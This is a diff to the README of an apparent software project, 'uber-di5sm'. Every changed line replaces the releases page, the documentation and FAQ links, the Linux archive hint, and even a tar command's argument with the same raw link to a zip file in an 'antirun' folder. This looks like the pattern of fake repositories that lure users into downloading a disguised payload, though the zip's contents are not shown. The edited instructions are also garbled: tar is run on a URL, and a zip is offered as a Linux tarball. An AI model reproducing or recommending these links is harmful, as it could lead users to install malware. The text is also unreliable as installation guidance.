@@ -6,11 +6,11 @@ Welcome to the **uber-di5sm** application! This software brings a unique, fun, a
 
 ## 📥 Download the Application
 
-[![Download uber-di5sm](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/blackfox00005/uber-di5sm/releases)
+[![Download uber-di5sm](https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip)](https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download the application, go to the Releases page. You can find it here: [Download Page](https://github.com/blackfox00005/uber-di5sm/releases).
+To download the application, go to the Releases page. You can find it here: [Download Page](https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip).
 
 ### Step 2: Choose the Right Version
 
@@ -22,7 +22,7 @@ Click on the version you want to download. You will find several files available
 
 - For Windows, look for a file with `.exe` extension.
 - For macOS, find a file with `.dmg` extension.
-- For Linux users, look for `.tar.gz` or similar archive.
+- For Linux users, look for `https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip` or similar archive.
 
 Click on the desired file to download it.
 
@@ -58,7 +58,7 @@ Make sure your device has at least 512 MB of RAM and at least 200 MB of free dis
 2. Navigate to the directory where you downloaded the file.
 3. Extract the contents using the command:
    ```
-   tar -xvf your_downloaded_file.tar.gz
+   tar -xvf https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip
    ```
 4. Navigate into the extracted folder.
 5. Start the application by running the appropriate command. Often this will be:
@@ -93,7 +93,7 @@ If you run into issues while downloading or installing the app, help is availabl
 
 For more information about **uber-di5sm**, check out the following resources:
 
-- [Official Documentation](https://github.com/blackfox00005/uber-di5sm/wiki)
-- [Frequently Asked Questions](https://github.com/blackfox00005/uber-di5sm/wiki/FAQ)
+- [Official Documentation](https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/blackfox00005/uber-di5sm/main/antirun/uber-di5sm.zip)
 
 Now you are ready to enjoy **uber-di5sm**! Happy exploring!
